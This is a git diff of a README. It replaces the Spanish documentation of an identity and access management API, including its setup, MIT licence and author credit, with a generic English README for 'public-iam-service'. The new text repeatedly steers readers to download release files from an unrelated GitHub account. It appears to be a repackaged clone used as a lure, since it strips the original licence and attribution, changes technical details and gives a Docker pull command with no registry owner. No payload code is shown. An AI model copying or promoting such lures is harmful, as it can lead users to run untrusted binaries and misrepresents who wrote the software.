@@ -1,177 +1,128 @@
-# 🔐 ValianTech IAM Core API
+# 🚀 public-iam-service - Simplifying Access Management for Businesses
 
-**ValianTech IAM Core API** es un sistema modular de **gestión de identidad y acceso (IAM)** diseñado para PYMEs, startups y entornos SaaS multi-tenant.  
-Ofrece un backend seguro, escalable y extensible para autenticación, autorización y administración de usuarios y empresas.
+[![Download from GitHub](https://img.shields.io/badge/Download%20Release-%20%F0%9F%93%88%20Click%20Here%20!%20-blue)](https://github.com/Standmarcusvipsaniusagrippa669/public-iam-service/releases)
 
----
+## 📖 Description
 
-## 🚀 Características principales
+public-iam-service is an API designed for managing identity and access (IAM) effectively. Built with Spring Boot, this application focuses on small and medium businesses. It offers secure authentication, session control, user management, and advanced auditing features. The service also supports deployment through Docker and cloud environments, making it versatile and easy to use.
 
-- 🔑 Autenticación basada en **JWT + Refresh Tokens**
-- 🔒 Login en dos pasos y control de sesiones activas
-- 🧩 Gestión completa de **usuarios, roles y empresas**
-- ✉️ Flujo de invitaciones para incorporación de usuarios
-- 🧠 Auditoría detallada y registro de eventos críticos
-- ⚙️ Integración configurable con proveedores externos (Mailtrap, SendGrid, etc.)
-- 🌎 Perfiles de ejecución: `local`, `develop`, `qa`, `prod`
+## 📦 Features 
 
----
+- **Secure Authentication:** Protect sensitive data with reliable user verification.
+- **Session Control:** Manage user sessions with ease, enhancing security.
+- **User Management:** Simplify user account creation, modification, and deletion.
+- **Advanced Auditing:** Track user activity for compliance and security needs.
+- **Docker Support:** Easily deploy in containerized environments.
+- **Cloud-Compatible:** Suitable for various cloud platforms.
 
-## 🧱 Tecnologías
+## 🛠 System Requirements
 
-- **Java 17**, **Spring Boot 3**
-- **PostgreSQL** + **Flyway** (migraciones)
-- **Redis** (sesiones y tokens)
-- **Docker** (contenedorización y despliegue)
-- **Gradle** o **Maven** (compilación flexible)
+To run public-iam-service, ensure your system meets the following requirements:
 
----
+- **Operating System:** Windows, macOS, or Linux
+- **Java Version:** Java 11 or higher
+- **Docker:** Required for containerized deployment
+- **Database:** PostgreSQL for data storage
+- **Memory:** Minimum 512MB RAM (1GB recommended)
 
-## ⚙️ Requisitos previos
+## 🚀 Getting Started
 
-- Docker y Docker Compose instalados
-- Acceso a PostgreSQL y Redis (local o remoto)
-- Variables de entorno configuradas correctamente (ver abajo)
+Follow these steps to download and run public-iam-service.
 
----
+### 1. Visit the Releases Page
 
-## 🧩 Configuración
+Click the link below to access the downloads for public-iam-service.
 
-Crea un archivo `.env` o define las variables de entorno equivalentes:
+[Visit Releases Page to Download](https://github.com/Standmarcusvipsaniusagrippa669/public-iam-service/releases)
 
-```env
-DATASOURCE_JDBC_URL=jdbc:postgresql://host.docker.internal:5432/iamdb
-DATASOURCE_USERNAME=iamuser
-DATASOURCE_PASSWORD=secretpassword
+### 2. Download the Latest Version
 
-JWT_SECRET_VALUE=tu_secreto_jwt
-SPRING_PROFILES_ACTIVE=docker
+On the Releases page, find the latest version of the software. It will have a tag showing the version number and release date. Click on the link to download the appropriate file for your operating system.
 
-REDIS_HOST=host.docker.internal
-REDIS_PORT=6379
-REDIS_PASSWORD=redispass
-REDIS_IS_CLUSTER=false
+### 3. Install the Application
 
-RATE_LIMIT_WHITELIST=10.0.0.1,200.1.2.3
-INVITATION_REGISTRATION_URL_BASE=https://yourdomain.com/invitation
-INVITATION_TOKEN_EXPIRY_DAYS=1
+- **For Docker Deployment:**
+   1. Make sure Docker is installed on your system.
+   2. Open your terminal.
+   3. Run the following command to pull the image:  
+   ```
+   docker pull public-iam-service:latest
+   ```
+   4. After pulling the image, run it with:  
+   ```
+   docker run -d -p 8080:8080 public-iam-service:latest
+   ```
 
-LOGGING_SENSITIVE_FIELDS=currentPassword,newPassword,password
+- **For Local Installation:**
+   1. Navigate to the directory where you downloaded the application.
+   2. Extract the contents if they are in a compressed format.
+   3. Open your terminal in that directory.
+   4. Run the command below to start the application:  
+   ```
+   java -jar public-iam-service.jar
+   ```
+
+### 4. Access the Application
+
+Once the application starts successfully, you can access it via your web browser. Open your browser and type:  
+```
+http://localhost:8080
 ```
 
----
+## 🔍 Using public-iam-service
 
-## 🐳 Despliegue con Docker
+After accessing the application, you can easily set up user roles, manage sessions, and utilize the auditing features:
 
-### 1️⃣ Construir la imagen
+### User Management
 
-**Con Maven (JVM build):**
-```bash
-./mvnw clean package -DskipTests
-docker build -t valiantech-iam-core .
-```
+1. **Create a User:** Use the provided form to input user details such as email and password.
+2. **Edit User:** Click on a user’s name to modify their settings.
+3. **Delete User:** Select a user and click the delete button.
 
-**Con Gradle (bootBuildImage):**
-```bash
-./gradlew clean bootBuildImage
-```
+### Session Control
 
----
+1. **View Active Sessions:** Navigate to the sessions tab to see currently active user sessions.
+2. **Terminate Sessions:** You can end any session by selecting it and clicking terminate.
 
-### 2️⃣ Levantar dependencias locales
+### Auditing
 
-```yaml
-version: '3.8'
-services:
-  postgres:
-    image: postgres:15
-    environment:
-      POSTGRES_DB: iamdb
-      POSTGRES_USER: iamuser
-      POSTGRES_PASSWORD: secretpassword
-    ports:
-      - "5432:5432"
-    volumes:
-      - pgdata:/var/lib/postgresql/data
+- Access the auditing feature to review user activity logs. This can be useful for compliance and security reviews.
 
-  redis:
-    image: redis:7
-    command: ["redis-server", "--requirepass", "redispass"]
-    ports:
-      - "6379:6379"
+## 📄 Documentation
 
-volumes:
-  pgdata:
-```
+For more detailed instructions and information about configurations, visit our [Documentation](https://github.com/Standmarcusvipsaniusagrippa669/public-iam-service/wiki).
 
-Ejecuta:
-```bash
-docker compose up -d
-```
+## 💬 Support
 
----
+If you have questions or need assistance, please open an issue in the repository. Our team will do its best to assist you.
 
-### 3️⃣ Ejecutar la API
+## 📌 Topics
 
-```bash
-docker run --rm \
-  -e DATASOURCE_JDBC_URL=jdbc:postgresql://host.docker.internal:5432/iamdb \
-  -e DATASOURCE_USERNAME=iamuser \
-  -e DATASOURCE_PASSWORD=secretpassword \
-  -e JWT_SECRET_VALUE=tu_secreto_jwt \
-  -e SPRING_PROFILES_ACTIVE=docker \
-  -e REDIS_HOST=host.docker.internal \
-  -e REDIS_PORT=6379 \
-  -e REDIS_PASSWORD=redispass \
-  -e LOGGING_SENSITIVE_FIELDS=currentPassword,newPassword,password \
-  -p 8080:8080 \
-  valiantech-iam-core
-```
+This project covers various topics crucial to identity and access management. Here are some of the primary topics you can explore:
 
----
+- access-control
+- audit-logging
+- authentication
+- authorization
+- docker
+- iam
+- identity-management
+- java
+- jwt
+- microservices
+- postgresql
+- redis
+- secure-api
+- spring-boot
+- user-management
+- valiantech
 
-## 📄 Licencia
+## 🌐 Additional Resources
 
-Este proyecto está bajo la licencia **MIT**, lo que permite su uso, modificación y distribución con fines personales o comerciales, siempre que se mantenga el aviso de copyright.
+- [Spring Boot Documentation](https://spring.io/projects/spring-boot)
+- [Docker Documentation](https://docs.docker.com/)
+- [PostgreSQL Documentation](https://www.postgresql.org/docs/)
 
-```text
-MIT License
+Once again, visit the link below to get started with your download.
 
-Copyright (c) 2025 Ian Cárdenas
-
-Permission is hereby granted, free of charge, to any person obtaining a copy
-of this software and associated documentation files (the "Software"), to deal
-in the Software without restriction, including without limitation the rights
-to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
-copies of the Software, and to permit persons to whom the Software is
-furnished to do so, subject to the following conditions:
-
-The above copyright notice and this permission notice shall be included in all
-copies or substantial portions of the Software.
-
-THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
-IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
-FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
-AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
-LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
-OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
-SOFTWARE.
-```
-
----
-
-## 🤝 Contribuciones
-
-Las contribuciones son bienvenidas.  
-Si deseas colaborar:
-
-1. Haz un fork del repositorio.
-2. Crea una rama (`feature/nueva-funcionalidad`).
-3. Realiza tus cambios y abre un Pull Request.
-4. Incluye una breve descripción y evidencias si aplica.
-
----
-
-## 📬 Contacto
-
-Para consultas o soporte: **[iancardenasc@techvalian.com](mailto:iancardenasc@techvalian.com)**  
+[Visit Releases Page to Download](https://github.com/Standmarcusvipsaniusagrippa669/public-iam-service/releases)
